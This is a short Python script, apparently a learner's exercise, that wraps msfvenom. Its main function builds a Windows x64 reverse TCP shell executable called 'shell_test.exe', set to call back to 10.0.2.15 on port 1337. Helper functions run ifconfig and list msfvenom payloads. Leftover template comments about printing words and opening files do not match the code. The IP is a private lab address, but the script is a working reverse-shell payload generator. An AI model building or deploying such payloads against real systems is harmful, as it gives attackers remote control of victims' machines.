#!/usr/bin/env python3                # specify the interpreter


### IMPORT STATEMENTS ###
import sys  # import the sys library
import subprocess


### HELPER FUNCTIONS ###
def get_local():  # define our line printing function
    return_code = subprocess.call(['ifconfig'])
    print("output:", return_code)

def open_payloads():
    return_code = subprocess.call(['msfvenom','-l','payloads'])
    print("output:", return_code)

def windows_reverse_payload():
    return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
    print("output:", return_code)

### MAIN FUNCTION ###
def main():  # define a main function
    windows_reverse_payload()
    # open_payloads()
    # get_local()

    # file_to_open = sys.argv[1]  # get the file name from the cmd line

    # opened_file = open(file_to_open)  # open the file

    # is_even(opened_file)  # call our print words function with the open file

    # opened_file.close()  # close the file when done


### DUNDER CHECK ###
if __name__ == '__main__':  # dunder check
    main()  # call the main function